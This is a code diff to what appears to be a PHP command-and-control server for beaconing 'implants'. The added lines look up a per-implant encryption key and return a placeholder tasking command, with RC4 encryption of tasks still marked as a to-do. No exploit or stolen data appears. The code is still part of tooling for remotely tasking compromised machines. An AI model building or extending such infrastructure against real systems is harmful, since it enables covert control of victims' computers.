@@ -73,6 +73,14 @@
                 $current_user = $implant["current_user"];
                 $operating_system = $implant["operating_system"];
 
+                # Gets encryption key (for later task encryption)
+                $statement = $database_connection->prepare("SELECT `encryption_key` FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
+                $statement->bindValue(":hostname", $hostname);
+                $statement->bindValue(":process_id", $process_id);
+                $statement->execute();
+                $results = $statement->fetch(PDO::FETCH_ASSOC);
+                $encryption_key = $results["encryption_key"];
+
                 # Determines if we have anything tasked for the beaconing implant
                 # TO DO: Remove "LIMIT 1" and allow it to get all tasks at once instead of being single-threaded
                 $statement = $database_connection->prepare("SELECT * FROM `tasks` WHERE `hostname` = :hostname AND `process_id` = :process_id LIMIT 1");
@@ -88,7 +96,9 @@
                 # If we have something tasked
                 # TO DO: Output RC4 encrypted task here
                 if ($row_count == 1) {
-                    echo "We have something tasked";
+                    # DEBUGGING
+                    #echo rc4($encryption_key, "print 'hunter is kewl'");
+                    echo "print 'hunter is kewl'";
                 }
             }
         }
